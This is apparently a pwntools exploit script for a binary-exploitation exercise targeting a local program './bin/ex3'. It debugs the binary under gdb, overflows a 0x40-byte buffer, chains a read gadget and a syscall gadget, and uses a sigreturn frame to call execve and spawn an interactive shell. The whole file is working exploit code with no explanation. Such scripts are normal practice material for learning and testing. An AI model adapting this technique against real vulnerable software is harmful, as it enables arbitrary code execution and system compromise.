from pwn import *

context.arch = "amd64"
context.terminal = ["tmux", "split-window", "-h"]

io = gdb.debug(
    "./bin/ex3",
    """
    b read_buf 
    c
    """,
)
#aaaaaaaaaaaaaa

read_gadget = p64(0x40101c)
syscall_gadget = 0x401019
sh_addr = 0x402000

frame = SigreturnFrame()
frame.rax = 59 # syscall code for execve
frame.rdi = sh_addr
frame.rsi = 0
frame.rdx = 0
frame.rsp = 0
frame.rip = syscall_gadget

io.sendline(b"A"*0x40 + read_gadget + p64(syscall_gadget) + bytes(frame))
io.send(b"A"*0xe)
io.interactive()

